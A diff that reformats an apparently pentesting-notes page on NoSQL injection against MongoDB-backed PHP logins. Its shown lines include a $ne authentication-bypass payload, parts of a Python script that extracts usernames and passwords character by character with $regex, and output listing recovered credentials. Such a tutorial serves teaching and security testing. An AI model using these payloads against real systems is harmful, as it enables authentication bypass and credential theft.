@@ -1,14 +1,16 @@
 ---
-description: NoSQL injection attacks can be especially dangerous because code
+title: NoSQL Injection (NoSQLi)
+category: Web
+order: 4
 ---
 
-# NoSQL Injection
+NoSQL injection attacks can be especially dangerous because code
 
-## Introduction
+# Introduction
 
 NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution.
 
-### Simple MongoDB Injection
+## Simple MongoDB Injection
 
 For a basic authentication bypass, the attacker can try to enter MongoDB operators in field values, for example `$eq` (equals), `$ne` (not equal to) or `$gt` (greater than). Here’s an unsafe way to build a database query in a PHP application, with the parameter values taken directly from a form:
 
@@ -32,7 +34,7 @@ array("username" => array("$ne" => 1), "password" =>
 
 When sent as a MongoDB query to a user store, this will find all users where the user name and password are not equal to 1, which is highly likely to be true and may allow the attacker to bypass authentication.
 
-## Login Bypass (PHP)
+# Login Bypass (PHP)
 
 Injecting the `$ne` :
 
@@ -41,11 +43,11 @@ Injecting the `$ne` :
 username[$ne]=&password[$ne]=&login=login
 ```
 
-### Dumping Database (PHP)
+## Dumping Database (PHP)
 
 First instead of `$ne` we are going to use `$regex` in order to discover character by character.
 
-#### Get all Usernames
+### Get all Usernames
 
 First we are going to see al type of characters used in the usernames.
 
@@ -69,9 +71,7 @@ for char in string.ascii_lowercase:
 		print("Valid letter: " + char)
 ```
 
-{% hint style="info" %}
-**Regex:** {}.\*
-{% endhint %}
+> **Regex:** {}.\*
 
 ```
 ❯ python3 exploit.py
@@ -107,9 +107,7 @@ for char in valid_letters:
 		print("Starts with: " + char)
 ```
 
-{% hint style="info" %}
-**Regex:** ^{}.\* ^ Indicates starts with
-{% endhint %}
+> **Regex:** ^{}.\* ^ Indicates starts with
 
 ```
 ❯ python3 exploit.py
@@ -162,7 +160,7 @@ Username: admin
 Username: mango
 ```
 
-#### Get Passwords:
+### Get Passwords:
 
 Same as users but remember to change the `$regex` of the user to `$ne` and the other way with password.
 
@@ -211,6 +209,4 @@ Username: admin Password: t9KcS3>!0B#2
 Username: mango Password: h3mXK8RhU~f{]f5H
 ```
 
-{% hint style="warning" %}
-**Remember:** Escape characters that could lead to problems with a regex.
-{% endhint %}
+> **Remember:** Escape characters that could lead to problems with a regex.
